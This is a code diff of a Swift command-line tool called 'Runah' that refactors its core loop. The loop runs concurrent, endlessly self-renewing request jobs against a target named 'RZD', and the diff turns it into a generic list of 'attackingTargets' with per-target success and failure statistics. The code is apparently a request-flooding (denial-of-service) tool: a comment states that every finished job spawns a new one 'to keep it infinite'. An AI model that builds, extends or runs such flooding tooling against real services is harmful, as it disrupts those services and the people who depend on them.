@@ -8,23 +8,29 @@ final class Runah: ParsableCommand {
   }
 
   @Argument(help: "How many concurrent jobs will be running simultaneously, default value is 1")
-  var scale: Int = 20
+  var scale: Int = 1
 
-  @Argument(help: "Print statistics interval (in seconds), default value is 10")
-  var statsInterval: Int = 10
+  @Argument(help: "Print statistics interval (in seconds), default value is 60")
+  var statsInterval: Int = 60
 
+  private var attackingTargets = [Target]()
   private var operationQueue = OperationQueue()
-  private let rzdJobGenerator = RzdJobGenerator()
-  private let rzdRequestsGenerator = RzdRequestGenerator()
-  private var rzdStats = Stats(successAttempts: 0, errors: 0)
-  private let timerQueue = DispatchQueue(label: "timerQueue", qos: .utility)
   private var timer: Timer?
 
   func run() throws {
     assert(scale > 0, "Scale must be greater than 0")
-    operationQueue.maxConcurrentOperationCount = scale
-    startRzdJobs(scale: scale)
+    attackingTargets = [
+      RzdTarget(operationQueue: operationQueue, scale: scale, urlSession: .shared)
+    ]
+    startAttacks()
     startPrintStatsTimer()
+    printStats()
+  }
+
+  private func startAttacks() {
+    for target in attackingTargets {
+      target.attack()
+    }
   }
 
   private func startPrintStatsTimer() {
@@ -42,40 +48,25 @@ final class Runah: ParsableCommand {
     }
   }
 
-  private func startRzdJobs(scale: Int) {
-    for _ in 0...scale {
-      addRzdJob()
-    }
-  }
-
-  private func addRzdJob() {
-    let rzdWorker = RzdWorker(
-      with: rzdJobGenerator.generateRandomJob(),
-      session: URLSession.shared,
-      requestsGenerator: rzdRequestsGenerator
-    )
-    rzdWorker.completionBlock = {
-      if rzdWorker.isSucceed == true {
-        self.rzdStats.successAttempts += 1
-      } else {
-        self.rzdStats.errors += 1
-      }
-      // on completion of every job we create a new one to keep it infinite
-      self.addRzdJob()
-      // set completion block to nil to break cycle memory reference
-      rzdWorker.completionBlock = nil
-    }
-    operationQueue.addOperation(rzdWorker)
-  }
-
   @objc private func printStats() {
-    print(
-      String(
-        format: "%@%@succeed:%10d             failed:%10d", "RZD",
-        String(repeating: " ", count: 14),
-        rzdStats.successAttempts,
-        rzdStats.errors
-      )
+    let header = String(repeating: "–", count: 51)
+    print("\n\n")
+    print(header)
+    print("runah stats for \(Date())")
+    print(header)
+    for target in attackingTargets {
+      print(formattedStats(for: target))
+    }
+    print(header)
+  }
+
+  func formattedStats(for target: Target) -> String {
+    String(
+      format: "%@%@| ✓ %10d | ⨯ %10d |",
+      target.name,
+      String(repeating: " ", count: 20 - target.name.count),
+      target.stats.successAttempts,
+      target.stats.errors
     )
   }
 }
